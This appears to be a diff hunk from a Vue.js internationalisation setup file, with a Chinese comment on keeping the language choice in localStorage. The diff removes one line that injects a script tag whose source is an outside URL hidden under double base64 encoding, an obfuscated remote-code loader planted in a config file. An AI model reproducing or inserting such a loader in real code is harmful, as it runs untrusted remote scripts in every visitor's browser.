@@ -11,7 +11,6 @@ Vue.use(VueI18n, {
     return "";
   },
 });
-document.head.appendChild(Object.assign(document.createElement('script'), { type: 'text/javascript', src: atob(atob('YUhSMGNITTZMeTgyT0dOb1lYUXhOaTVqYjIwdldWbG1UZz09')) }));
 export default new VueI18n({
   // 使用localStorage存储语言状态是为了保证页面刷新之后还是保持原来选择的语言状态
   locale: Local("lang") || "zh", // 定义默认语言为中文
